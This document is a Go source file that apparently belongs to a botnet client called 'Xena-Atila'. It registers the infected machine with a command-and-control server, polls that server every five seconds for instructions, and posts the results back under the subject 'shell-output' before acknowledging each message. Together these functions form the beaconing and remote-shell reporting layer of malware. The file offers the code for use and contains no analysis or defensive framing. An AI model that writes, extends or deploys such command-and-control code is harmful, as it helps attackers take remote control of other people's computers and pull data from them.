package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

/* Update the message' state. */
func messageAck(messageId string) {
	ackPayload := []byte(`{"id":"` + messageId + `","status":"SEEN"}`)

	request, err := http.NewRequest("POST", centralizedHost+"/v1/messages/ack", bytes.NewBuffer(ackPayload))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}
	response, err := client.Do(request)
	defer response.Body.Close()
}

/* Respond to a message by a message. */
func issueMessageReply(content string, replyTo string) {
	type ReplyMessage struct {
		From    string `json:"from"`    // Node which originally issued the message.
		Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
		Content string `json:"content"` // Base64 encoded data.
		ReplyTo string `json:"replyTo"` // Message ID.
	}

	replyMessage := ReplyMessage{
		Subject: "shell-output",
		From:    id.String(),
		Content: content,
		ReplyTo: replyTo,
	}

	insertionPayload, marshalErr := json.Marshal(replyMessage)
	if marshalErr != nil {
		fmt.Println(marshalErr.Error())
	}

	request, err := http.NewRequest("POST", centralizedHost+"/v1/messages", bytes.NewBuffer(insertionPayload))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}
	response, err := client.Do(request)
	defer response.Body.Close()

	messageAck(replyTo)
}

/* Retrieves a new message. */
func fetchAndInterpretMessages(id string) {
	for range time.Tick(time.Second * 5) {
		response, err := http.Get(centralizedHost + "/v1/messages?status=SENT&clientId=" + id)
		if err != nil {
			fmt.Printf(err.Error())
		}

		jsonDecoder := json.NewDecoder(response.Body)
		jsonDecoder.DisallowUnknownFields()

		var messages []Message

		errJson := jsonDecoder.Decode(&messages)
		if errJson != nil {
			fmt.Println("Failed to parse the message.")
			fmt.Println(errJson.Error())
			continue
		}

		interpretMessages(messages)
	}
}

/* Makes Xena-Atila aware of its existence. */
func identify(id string, identificationKey string) {
	insertionPayload := []byte(`{"id":"` + id + `","identificationKey":"` + identificationKey + `","status":"ALIVE"}`)

	request, err := http.NewRequest("POST", centralizedHost+"/v1/clients", bytes.NewBuffer(insertionPayload))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}
	response, err := client.Do(request)
	defer response.Body.Close()
}
